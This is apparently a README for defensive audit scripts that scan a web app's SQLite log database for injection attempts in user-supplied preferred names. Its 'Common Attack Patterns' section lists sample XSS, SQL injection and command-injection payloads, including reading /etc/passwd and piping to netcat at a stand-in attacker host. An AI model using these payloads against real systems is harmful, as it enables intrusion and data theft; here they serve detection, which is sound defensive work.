# Database Security Audit Tools

This directory contains tools for auditing the database for potential injection attacks in preferred names.

## Scripts

### 1. `check-injections.sh` - Full Security Audit
Comprehensive audit that checks for all types of injection attempts.

**Usage:**
```bash
cd src/audit
./check-injections.sh
# or specify database path
./check-injections.sh /path/to/logs.db
```

**Features:**
- ✅ Detects XSS (Cross-Site Scripting) attempts
- ✅ Detects SQL injection patterns
- ✅ Detects command injection attempts
- ✅ Checks for non-ASCII characters
- ✅ Validates length constraints
- ✅ Generates detailed reports
- ✅ Color-coded output

**Output:**
- Console output with color-coded results
- Detailed report saved to `audit-report-YYYYMMDD-HHMMSS.txt`

---

### 2. `quick-check.sh` - Quick Security Check
Fast check for common issues.

**Usage:**
```bash
cd src/audit
./quick-check.sh
```

**What it checks:**
- Total preferred names count
- HTML special characters (<, >, &)
- Quotes (' and ")
- Script tags
- Length violations (>16 chars)

---

### 3. `sql-queries.sql` - Manual SQL Queries
Collection of SQL queries for manual database inspection.

**Usage:**
```bash
# Open database
sqlite3 ../../logs.db

# Run queries from file
.read sql-queries.sql

# Or run individual queries
.mode column
.headers on
SELECT * FROM logs WHERE preferred_name LIKE '%<%';
```

**Query Categories:**
1. XSS Detection
2. SQL Injection Detection
3. Command Injection Detection
4. Statistics & Overview
5. Unique Preferred Names
6. User Behavior Tracking
7. Recent Activity
8. Length Analysis
9. Fingerprint History Search
10. Clean Malicious Entries (with caution)

---

## Common Attack Patterns

### XSS (Cross-Site Scripting)
```
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>
```

### SQL Injection
```
' OR '1'='1
admin'--
'; DROP TABLE users--
1' UNION SELECT * FROM logs--
```

### Command Injection
```
; ls -la
$(whoami)
`cat /etc/passwd`
| nc attacker.com 1234
```

### HTML Injection
```
<h1>Defaced</h1>
<iframe src="evil.com">
<style>body{display:none}</style>
```

---

## Prevention Measures

Our application has multiple layers of protection:

1. **Client-side Sanitization** (`src/client/modules/main.js`)
   - Removes HTML special characters
   - Strips non-printable ASCII
   - Enforces 16-char limit

2. **Client-side HTML Escaping** (`src/client/modules/leaderboard.js`)
   - Escapes HTML when displaying names
   - Prevents XSS attacks

3. **Server-side Validation** (`src/server/index.ts`)
   - Double-checks all input
   - Defense-in-depth approach

4. **Database Protection**
   - Parameterized queries (prepared statements)
   - No string concatenation in SQL

---

## Running Regular Audits

### Daily Audit (Cron Job)
```bash
# Add to crontab
crontab -e

# Run audit daily at 2 AM
0 2 * * * cd /home/yanh/dev/web-term/src/audit && ./check-injections.sh > /tmp/db-audit-$(date +\%Y\%m\%d).log 2>&1
```

### Weekly Report
```bash
# Run comprehensive audit weekly
0 2 * * 0 cd /home/yanh/dev/web-term/src/audit && ./check-injections.sh ../../logs.db
```

---

## Database Backup

**Before making any changes to the database:**

```bash
# Backup with timestamp
cp logs.db logs.db.backup.$(date +%Y%m%d_%H%M%S)

# Export to SQL
sqlite3 logs.db .dump > logs_backup.sql
```

---

## Cleaning Malicious Entries

If you find malicious entries:

```sql
-- 1. Preview what will be cleaned
SELECT
    id,
    preferred_name,
    REPLACE(REPLACE(REPLACE(preferred_name, '<', ''), '>', ''), '&', '') as cleaned
FROM logs
WHERE preferred_name LIKE '%<%' OR preferred_name LIKE '%>%';

-- 2. BACKUP FIRST!
-- cp logs.db logs.db.backup

-- 3. Clean the entries
UPDATE logs
SET preferred_name = REPLACE(REPLACE(REPLACE(preferred_name, '<', ''), '>', ''), '&', '')
WHERE preferred_name LIKE '%<%' OR preferred_name LIKE '%>%';

-- Or remove entirely
UPDATE logs
SET preferred_name = NULL
WHERE preferred_name LIKE '%<%' OR preferred_name LIKE '%>%';
```

---

## Troubleshooting

### Script not executable
```bash
chmod +x check-injections.sh quick-check.sh
```

### Database not found
```bash
# Make sure you're in the right directory
cd /home/yanh/dev/web-term/src/audit

# Or specify full path
./check-injections.sh /home/yanh/dev/web-term/logs.db
```

### SQLite not installed
```bash
# Install SQLite
# Ubuntu/Debian
sudo apt-get install sqlite3

# macOS
brew install sqlite3
```

---

## Security Best Practices

1. ✅ **Never trust user input** - Always sanitize and validate
2. ✅ **Use parameterized queries** - Prevents SQL injection
3. ✅ **Escape HTML output** - Prevents XSS attacks
4. ✅ **Enforce input constraints** - Length, character set, format
5. ✅ **Defense in depth** - Multiple layers of validation
6. ✅ **Regular audits** - Check for suspicious patterns
7. ✅ **Monitor logs** - Track unusual activity
8. ✅ **Keep backups** - In case of data corruption

---

## Quick Reference

```bash
# Quick check
./quick-check.sh

# Full audit
./check-injections.sh

# Manual SQL
sqlite3 ../../logs.db
.read sql-queries.sql

# Check specific fingerprint
sqlite3 ../../logs.db "SELECT * FROM logs WHERE fingerprint LIKE 'abc123%';"

# Count by event type
sqlite3 ../../logs.db "SELECT event_type, COUNT(*) FROM logs GROUP BY event_type;"
```

---

## Current Status

✅ **Your database is clean!**
- 4 entries with preferred names
- 0 entries with suspicious characters
- All sanitization working correctly

Last audit: Check `audit-report-*.txt` files for detailed history
